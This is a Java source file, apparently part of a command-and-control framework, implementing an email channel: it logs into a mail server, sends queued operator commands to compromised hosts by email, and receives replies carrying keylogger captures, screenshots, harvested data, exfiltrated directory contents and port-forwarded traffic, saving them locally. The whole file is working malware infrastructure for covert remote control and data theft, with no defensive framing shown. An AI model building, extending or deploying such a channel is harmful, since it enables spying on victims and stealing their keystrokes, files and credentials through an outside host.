package c2.smtp;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;
import java.util.Properties;
import java.util.concurrent.CountDownLatch;

import com.sun.mail.smtp.SMTPTransport;

import c2.C2Interface;
import c2.Constants;
import c2.HarvestProcessor;
import c2.KeyloggerProcessor;
import c2.http.HTTPSManager;
import c2.session.IOManager;
import c2.session.filereceiver.FileReceiverDatagramHandler;
import jakarta.mail.Flags.Flag;
import jakarta.mail.Folder;
import jakarta.mail.Message;
import jakarta.mail.MessagingException;
import jakarta.mail.Session;
import jakarta.mail.Store;
import jakarta.mail.internet.InternetAddress;
import jakarta.mail.internet.MimeMessage;
import util.Time;

public class EmailHandler extends C2Interface {

	private boolean stayAlive = true;
	private CountDownLatch stopLatch = new CountDownLatch(1);

	public static final String KEYLOGGER_PREFIX = "Keylogger: ";
	public static final String SCREENSHOT_PREFIX = "Screenshot: ";
	public static final String HARVEST_PREFIX = "HARVEST:";
	public static final String PORT_FORWARD_PREFIX = "PortForward: ";
	public static final String DIR_HARVEST_PREFIX = "DirectoryHarvest: ";
	
	private int smtpPort;
	private String emailHost;
	private String emailUsername;
	private String emailPassword;

	private String lz;

	private HarvestProcessor harvester;

	@Override
	public String getName() {
		return "Email Service";
	}

	@Override
	public void notifyPendingShutdown() {
		stayAlive = false;
	}

	public void stop() {
		stayAlive = false;
		try {
			stopLatch.await();
		} catch (InterruptedException e) {
			// Continue
		}
		try {
			t.close();
		} catch (MessagingException e) {
			e.printStackTrace();
			// Keep going, close it down
		}
	}

	private Session session;
	private SMTPTransport t;
	private IOManager io;

	private KeyloggerProcessor keylogger;
	private FileReceiverDatagramHandler fileReceiverProcessor;
	
	public void initialize(IOManager io, Properties prop, KeyloggerProcessor keylogger, HarvestProcessor harvester)
			throws Exception {
		this.io = io;
		this.smtpPort = Integer.parseInt(prop.getProperty(Constants.DAEMON_EMAIL_PORT));
		this.emailHost = prop.getProperty(Constants.DAEMON_EMAIL_HOST);
		this.emailUsername = prop.getProperty(Constants.DAEMON_EMAIL_USERNAME);
		this.emailPassword = prop.getProperty(Constants.DAEMON_EMAIL_PASSWORD);
		this.keylogger = keylogger;

		this.lz = prop.getProperty(Constants.DAEMONLZHARVEST);
		this.harvester = harvester;

		// Create a Properties object to contain connection configuration
		// information.
		Properties props = System.getProperties();
		props.put("mail.transport.protocol", "smtp");
		props.put("mail.smtp.port", smtpPort);
		props.put("mail.smtp.starttls.enable", "true");
		props.put("mail.smtp.auth", "true");

		// Create a Session object to represent a mail session with the
		// specified properties.
		session = Session.getDefaultInstance(props);

		t = (SMTPTransport) session.getTransport("smtp");// or smtps?
		t.connect(emailHost, emailUsername, emailPassword);
		fileReceiverProcessor = new FileReceiverDatagramHandler(Paths.get(prop.getProperty(Constants.DAEMON_EXFILTEST_DIRECTORY)));
	}

	public static final String HOSTNAME = "HOSTNAME";
	public static final String USERNAME = "USERNAME";
	public static final String PROTOCOL = "PROTOCOL";
	public static final String PID = "PID";

	// This map holds session IDs and emails. Every time a new session is added via
	// this class (via detection in the inbox), it is added to the map.
	private Map<String, String> sessionToEmails = new HashMap<>();

	@Override
	public void run() {

		while (stayAlive) {

			// Transmit commands
			for (String session : sessionToEmails.keySet()) {
				Integer sessionId = io.getSessionId(session);
				String command = io.pollCommand(sessionId);
				while (command != null) {
					sendEmail(session, command, sessionToEmails.get(session));
					command = io.pollCommand(sessionId);
				}
				for(String address : io.availableForwards(sessionId)) {
					String forward = io.grabForwardedTCPTraffic(sessionId, address);
					if(forward != null) {
						sendEmail(PORT_FORWARD_PREFIX + address + " " + session, forward, sessionToEmails.get(session));
					}
				}
			}

			// Read back any response
			SimpleEmail nextEmail = getNextMessage();
			if (nextEmail != null) {
				String sessionElements = nextEmail.subject;

				boolean isScreenshot = false;
				boolean isKeylogger = false;
				boolean isHarvest = false;
				String harvestType = null;
				boolean isPortForward = false;
				String forwardAddress = null;
				boolean isDirHarvest = false;
				int dirHarvestId = 0;
				//System.out.println("Processing email: " + sessionElements);
				if (sessionElements.startsWith(KEYLOGGER_PREFIX)) {
					sessionElements = sessionElements.replace(KEYLOGGER_PREFIX, "");
					isKeylogger = true;
				} else if (sessionElements.startsWith(SCREENSHOT_PREFIX)) {
					sessionElements = sessionElements.replace(SCREENSHOT_PREFIX, "");
					isScreenshot = true;
				}else if(sessionElements.startsWith(DIR_HARVEST_PREFIX)) {
					sessionElements = sessionElements.replace(DIR_HARVEST_PREFIX, "");
					int firstSpaceIdx = sessionElements.indexOf(" ");
					dirHarvestId = Integer.parseInt(sessionElements.substring(0, firstSpaceIdx));
					sessionElements = sessionElements.substring(firstSpaceIdx + 1);
					isDirHarvest = true;
				} else if (sessionElements.startsWith(HARVEST_PREFIX)) {
					sessionElements = sessionElements.replace(HARVEST_PREFIX, "");
					int firstSpaceIdx = sessionElements.indexOf(" ");
					harvestType = sessionElements.substring(0, firstSpaceIdx);
					sessionElements = sessionElements.substring(firstSpaceIdx + 1);
					isHarvest = true;
				} else if(sessionElements.startsWith(PORT_FORWARD_PREFIX)) {
					//System.out.println("Its a forward");
					sessionElements = sessionElements.replace(PORT_FORWARD_PREFIX, "");
					int firstSpaceIdx = sessionElements.indexOf(" ");
					forwardAddress = sessionElements.substring(0, firstSpaceIdx);
					sessionElements = sessionElements.substring(firstSpaceIdx + 1);
					isPortForward = true;
				}

				String elements[] = sessionElements.split(" ");
				String hostname = null;
				String username = null;
				String protocol = null;
				String pid = null;
				for (String element : elements) {
					String pairs[] = element.split(":");
					if (pairs.length != 2) {
						continue;// Improperly formatted email, discard
					}
					if (pairs[0].equals(HOSTNAME)) {
						hostname = pairs[1];
					} else if (pairs[0].equals(USERNAME)) {
						username = pairs[1];
					} else if (pairs[0].equals(PROTOCOL)) {
						protocol = pairs[1];
					} else if (pairs[0].equals(PID)) {
						pid = pairs[1];
					}

				}

				if (hostname == null || username == null || protocol == null) {
					continue;// Improperly formatted email, discard
				}
				String sessionUID = hostname + ":" + username + ":" + protocol;
				//Integer sessionId = io.getSessionId(sessionUID);
				//if (sessionId == null) {
				//	sessionId = io.addSession(username, hostname, protocol);
				int sessionId = io.determineAndGetCorrectSessionId(hostname, username, protocol, false, sessionUID);
				io.updateSessionContactTime(sessionId);
					sessionToEmails.put(sessionUID, nextEmail.sender);
				//}
				if (isKeylogger) {
					keylogger.writeEntry(hostname, nextEmail.body.toString());
				}else if(isDirHarvest) {
					if(!fileReceiverProcessor.hasSessionCurrently(sessionId, dirHarvestId)) {
						fileReceiverProcessor.registerNewSession(sessionId, dirHarvestId, hostname);
					}
					try {
						byte[] harvestData = Base64.getDecoder().decode(nextEmail.body.toString().replaceAll("\r", "").replaceAll("\n", ""));
						fileReceiverProcessor.processIncoming(sessionId, dirHarvestId, harvestData);
					}catch(IllegalArgumentException ex) {
						ex.printStackTrace();
					}
				} else if (isHarvest) {
					harvester.processHarvest(harvestType, hostname, pid, username, nextEmail.body.toString());
				} else if (isScreenshot) {
					try {
						byte[] data = Base64.getDecoder()
								.decode(nextEmail.body.toString().replaceAll("\r", "").replaceAll("\n", ""));
						String localPath = hostname + "-screen" + File.separator + username;
						Files.createDirectories(Paths.get(lz + File.separator + localPath).toAbsolutePath());
						try (OutputStream stream = new FileOutputStream(lz + File.separator + localPath + File.separator
								+ HTTPSManager.ISO8601_WIN.format(new Date()) + ".png")) {
							stream.write(data);
						}
					} catch (RuntimeException | IOException ex) {
						ex.printStackTrace();
					}
				}else if (isPortForward) {
					String b64Content = nextEmail.body.toString();
					b64Content = b64Content.replaceAll("\n", "");
					b64Content = b64Content.replaceAll("\r", "");
					io.queueForwardedTCPTraffic(sessionId, forwardAddress, b64Content);
				} else {
					io.sendIO(sessionId, nextEmail.body);
				}

			} else {
				Time.sleepWrapped(100);
			}
		}
		stopLatch.countDown();
	}

	public boolean sendEmail(String subject, String txtMessage, String address) {
		//System.out.println("Sending an email: " + subject + " - " + txtMessage + " address - " + address);
		try {
			// create a MimeMessage object
			Message message = new MimeMessage(session);

			// set From email field
			message.setFrom(new InternetAddress(emailUsername));

			// set To email field
			message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(address));

			// set email subject field
			message.setSubject(subject);

			// set the content of the email message
			message.setContent(txtMessage, "text/plain");

			// send the email message
			t.sendMessage(message, message.getAllRecipients());
		} catch (MessagingException e) {
			throw new RuntimeException(e);
		}
		return true;
	}

	public SimpleEmail getNextMessage() {
		try {
			Store store = session.getStore("imap");
			store.connect(emailHost, emailUsername, emailPassword);
			// Open the Folder

			Folder folder = store.getDefaultFolder();
			if (folder == null) {
				return null;
			}

			String mbox = "INBOX";
			folder = folder.getFolder(mbox);
			if (folder == null) {
				return null;
			}

			// try to open read/write and if that fails try read-only
			try {
				folder.open(Folder.READ_WRITE);
			} catch (MessagingException ex) {
				folder.open(Folder.READ_ONLY);
			}
			int totalMessages = folder.getMessageCount();

			if (totalMessages == 0) {
				folder.close(false);
				store.close();
				return null;
			}

			int msgnum = 1;
			SimpleEmail email = null;
			try {
				Message m = folder.getMessage(msgnum);
				// Process message before nuking it.
				String subject = m.getSubject();// This will be the sessionID to use
				String body = (String) m.getContent();
				String sender = m.getFrom()[0].toString();
				email = new SimpleEmail(sender, subject, body);

				m.setFlag(Flag.DELETED, true);
				folder.expunge();

			} catch (IndexOutOfBoundsException iex) {
				System.out.println("Message number out of range");
				return null;
			} catch (IOException e) {
				System.out.println("Someone sent a non-text line");
				return null;
			}

			folder.close(false);
			store.close();

			return email;
		} catch (MessagingException ex) {
			ex.printStackTrace();
			return null;
		}
	}

	@Override
	public void awaitStartup() {
		//Interface requires no initialization allow incoming messages to queue.
	}

}
